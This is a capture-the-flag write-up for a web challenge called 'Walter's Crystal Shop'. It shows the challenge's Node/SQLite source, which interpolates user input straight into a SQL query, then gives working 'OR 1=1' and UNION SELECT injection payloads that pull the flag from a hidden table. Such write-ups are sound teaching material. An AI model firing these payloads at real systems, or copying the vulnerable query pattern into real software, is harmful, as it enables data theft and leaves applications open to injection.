---
layout: writeup
category: Newport-Blake-CTF-2023
chall_description: https://i.imgur.com/O74FGE5.png
points: 241
solves: 162
tags: web web/SQLi web/sql-union
date: 2023-12-4
comments: false
---

My buddy Walter is selling some crystals, check out his shop!  

[walters-crystal-shop.chal.nbctf.com](walters-crystal-shop.chal.nbctf.com)  

[walters_crystal_shop.zip](https://github.com/Nightxade/ctf-writeups/blob/master/assets/CTFs/Newport-Blake-CTF-2023/web/walters_crystal_shop.zip)  

---

The source includes an `app.js` file. Here it is:  

```js
const express = require("express");
const sqlite3 = require("sqlite3");
const fs = require("fs");

const app = express();
const db = new sqlite3.Database(":memory:");

const flag = fs.readFileSync("./flag.txt", { encoding: "utf8" }).trim();
const crystals = require("./crystals");

db.serialize(() => {
  db.run("CREATE TABLE crystals (name TEXT, price REAL, quantity INTEGER)");

  const stmt = db.prepare("INSERT INTO crystals (name, price, quantity) VALUES (?, ?, ?)");

  for (const crystal of crystals) {
    stmt.run(crystal["name"], crystal["price"], crystal["quantity"]);
  }
  stmt.finalize();

  db.run("CREATE TABLE IF NOT EXISTS flag (flag TEXT)");
  db.run(`INSERT INTO flag (flag) VALUES ('${flag}')`);
});

app.get("/crystals", (req, res) => {
  const { name } = req.query;

  if (!name) {
    return res.status(400).send({ err: "Missing required fields" });
  }

  db.all(`SELECT * FROM crystals WHERE name LIKE '%${name}%'`, (err, rows) => {
    if (err) {
      console.error(err.message);
      return res.status(500).send('Internal server error');
    }

    return res.send(rows);
  });
});

app.get("/", (req, res) => {
  res.sendfile(__dirname + "/index.html");
});

app.listen(3000, () => {
  console.log("Server listening on port 3000");
});
```

The site seems to use SQLite3 for its database services. There also seems to be zero filtering for the SQL query. SQL Injection perhaps?  

I first tested with the following payload:  

    'OR%201=1-- 

And this is actually returned all crystals!  

So SQL injection works, but we need to access the `flag` table, not the `crystals` table. Maybe we can just construct a UNION attack?  

For those who don't know, a UNION attack is essentially an SQL injection that uses the UNION keyword to select elements from another table. All that you have to keep in mind is to match the number of categories used by the original selection, i.e. 3 in this case sinde 3 categories are selected from the `crytals` table. Therefore, the following payload should get the flag:  

    'UNION%20SELECT%20flag,NULL,NULL%20FROM%20flag--

Send the payload in and retrieve the flag!  

    nbctf{h0p3fuLLy_7h3_D3A_d035n7_kn0w_ab0ut_th3_0th3r_cRyst4l5}